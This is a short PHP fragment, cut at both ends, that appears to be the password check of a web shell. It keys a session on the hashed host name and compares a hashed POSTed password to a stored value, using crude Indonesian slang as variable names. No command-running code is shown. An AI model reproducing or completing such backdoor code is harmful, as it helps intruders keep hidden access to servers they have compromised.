	if( !isset($_SESSION[$ramdangantengbanget($_SERVER['HTTP_HOST'])] ))
    if( empty($memek) ||
        ( isset( $_POST['pass'] ) && ($ramdangantengbanget($_POST['pass']) == $memek) ) )
